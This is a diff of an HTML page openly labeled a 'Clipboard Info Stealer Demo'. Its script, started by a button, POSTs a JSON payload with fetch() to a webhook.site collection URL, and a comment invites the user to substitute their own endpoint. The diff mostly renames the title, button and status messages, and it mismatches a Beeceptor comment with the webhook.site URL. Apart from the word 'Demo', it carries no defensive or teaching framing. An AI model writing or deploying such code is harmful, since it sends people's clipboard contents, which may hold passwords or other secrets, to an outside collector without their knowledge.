@@ -2,11 +2,11 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Clipboard Info Stealer Demo (Chrome Test)</title>
+  <title>Clipboard POST Demo</title>
 </head>
 <body>
-  <h1>🚨 Clipboard Info Stealer (Chrome Test)</h1>
-  <button onclick="stealClipboard()">Steal Clipboard & POST</button>
+  <h1>🚨 Clipboard Info Stealer Demo</h1>
+  <button onclick="stealClipboard()">Read & POST Clipboard</button>
   <pre id="output"></pre>
 
   <script>
@@ -23,8 +23,8 @@
           timestamp: new Date().toISOString()
         };
 
-        // 🔁 ⛔ Replace the URL below with your actual Webhook.site URL
-        const webhookURL = "https://webhook.site/e9fe751d-ca09-45fb-bdd5-6742ffe0f4d7";
+        // ✅ Replace this with your Beeceptor endpoint
+        const webhookURL = "https://webhook.site/e9fe751d-ca09-45fb-bdd5-6742ffe0f4d7"; // ← Replace this line
 
         const response = await fetch(webhookURL, {
           method: "POST",
@@ -34,10 +34,10 @@
           body: JSON.stringify(payload)
         });
 
-        output.textContent += `\n\n✅ POST Sent! Status: ${response.status}`;
+        output.textContent += `\n\n✅ POST sent to Beeceptor\nStatus: ${response.status}`;
       } catch (err) {
         output.textContent += `\n\n❌ Error: ${err}`;
-        console.error("Fetch Error:", err);
+        console.error("Fetch error:", err);
       }
     }
   </script>
